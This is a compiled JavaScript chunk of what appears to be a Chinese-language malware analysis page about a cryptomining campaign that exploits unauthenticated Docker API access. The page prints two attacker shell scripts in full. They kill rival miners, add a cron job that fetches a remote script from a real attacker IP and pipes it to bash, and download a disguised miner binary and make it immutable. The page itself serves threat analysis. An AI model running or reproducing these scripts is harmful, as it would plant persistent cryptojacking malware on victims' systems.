(window.webpackJsonp=window.webpackJsonp||[]).push([[43],{395:function(n,t,r){"use strict";r.r(t);var e=r(1),a=Object(e.a)({},function(){var n=this,t=n.$createElement,r=n._self._c||t;return r("ContentSlotsDistributor",{attrs:{"slot-key":n.$parent.slotKey}},[r("p",[n._v("利用Docker API未授权访问执行漏洞传播挖矿木马，攻击目标端口号为49153")]),n._v(" "),r("p",[n._v("exp攻击成功后,首先下载cron.sh执行.脚本cron.sh，检查并清理其他挖矿进程然后下载并运行自身的挖矿程序,"),r("a",{attrs:{href:"http://85.214.149.236:443/sugarcrm//.../cron.sh",target:"_blank",rel:"noopener noreferrer"}},[n._v("cron.sh地址"),r("OutboundLink")],1),n._v(",代码如下:")]),n._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[n._v("#!/bin/sh\nLDR=\"wget -q -O -\"\nif [ -s /usr/bin/curl ]; then\n  LDR=\"curl\"\nfi\nif [ -s /usr/bin/wget ]; then\n  LDR=\"wget -q -O -\"\nfi\n\ncrontab -l | sed '/update.sh/d' | crontab -\ncrontab -l | sed '/logo4/d' | crontab -\ncrontab -l | sed '/logo9/d' | crontab -\ncrontab -l | sed '/logo0/d' | crontab -\ncrontab -l | sed '/logo/d' | crontab -\ncrontab -l | sed '/tor2web/d' | crontab -\ncrontab -l | sed '/jpg/d' | crontab -\ncrontab -l | sed '/png/d' | crontab -\ncrontab -l | sed '/tmp/d' | crontab -\ncrontab -l | sed '/zmreplchkr/d' | crontab -\ncrontab -l | sed '/aliyun.one/d' | crontab -\ncrontab -l | sed '/3.215.110.66.one/d' | crontab -\ncrontab -l | sed '/pastebin/d' | crontab -\ncrontab -l | sed '/onion/d' | crontab -\ncrontab -l | sed '/lsd.systemten.org/d' | crontab -\ncrontab -l | sed '/shuf/d' | crontab -\ncrontab -l | sed '/ash/d' | crontab -\ncrontab -l | sed '/mr.sh/d' | crontab -\ncrontab -l | sed '/185.181.10.234/d' | crontab -\ncrontab -l | sed '/localhost.xyz/d' | crontab -\ncrontab -l | sed '/45.137.151.106/d' | crontab -\ncrontab -l | sed '/111.90.159.106/d' | crontab -\npkill -f sysupdate\npkill -f networkservice\npkill -f sysguard\nps aux| grep \"sleep 60\"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %\nps aux| grep \"./crun\"| grep -v grep | awk '{print $2}' | xargs -I % kill -9 %\npgrep -f ./watchbog | xargs -I % kill -9 %\nnetstat -antp | grep '108.174.197.76' | grep 'ESTABLISHED\\|SYN_SENT' | awk '{print $7}' | sed -e \"s/\\/.*//g\" | xargs -I % kill -9 %\nnetstat -antp | grep '192.236.161.6' | grep 'ESTABLISHED\\|SYN_SENT' | awk '{print $7}' | sed -e \"s/\\/.*//g\" | xargs -I % kill -9 %\nnetstat -antp | grep '88.99.242.92' | grep 'ESTABLISHED\\|SYN_SENT' | awk '{print $7}' | sed -e \"s/\\/.*//g\" | xargs -I % kill -9 %\npkill -f pastebin\npkill -f 185.193.127.115\ncrontab -l | grep -e \"85.214.149.236\" | grep -v grep\nif [ $? -eq 0 ]; then\n  echo \"cron good\"\nelse\n  echo \"setup cron\"\n  (\n    crontab -l 2>/dev/null\n    echo \"* * * * * $LDR http://85.214.149.236:443/sugarcrm//.../run | bash > /dev/null 2>&1\"\n  ) | crontab -\nfi\n")])])]),r("p",[n._v("脚本run，会伪装成banner.php的,其实是docker-update ELF文件。"),r("a",{attrs:{href:"http://85.214.149.236:443/sugarcrm//.../run",target:"_blank",rel:"noopener noreferrer"}},[n._v("run.sh地址"),r("OutboundLink")],1),n._v(",代码如下:")]),n._v(" "),r("div",{staticClass:"language- extra-class"},[r("pre",{pre:!0,attrs:{class:"language-text"}},[r("code",[n._v('#!/bin/sh\n\nfunction downloadxmin(){\nwget -q http://85.214.149.236:443/sugarcrm//banner.php -O /usr/bin/docker-update\nchmod +x /usr/bin/docker-update 2>/dev/null 1>/dev/null\nchattr +i /usr/bin/docker-update 2>/dev/null 1>/dev/null\ntntrecht +i /usr/bin/docker-update 2>/dev/null 1>/dev/null\n}\n\nfunction startxmin(){\nxminpid=`pidof /usr/bin/docker-update` 2>/dev/null 1>/dev/null\n\nif [ -z "${xminpid}" ]; then\n    #echo "xmin not running! starting now!"\n    /usr/bin/docker-update 2>/dev/null 1>/dev/null\nelse\n\t#echo "xmin is running"\n\techo " "\nfi\n}\n\n\nif [ -f /usr/bin/docker-update ] ; then\n\t#echo \'xmin found\'\n\tstartxmin\nelse\n\t#echo \'xmin not found\'\n\tdownloadxmin\n\tstartxmin\nfi\n')])])]),r("p",[n._v("该地址的其他样本如下:\nhttp://85.214.149.236:443/sugarcrm//.../\n截图如下:")])])},[],!1,null,null,null);t.default=a.exports}}]);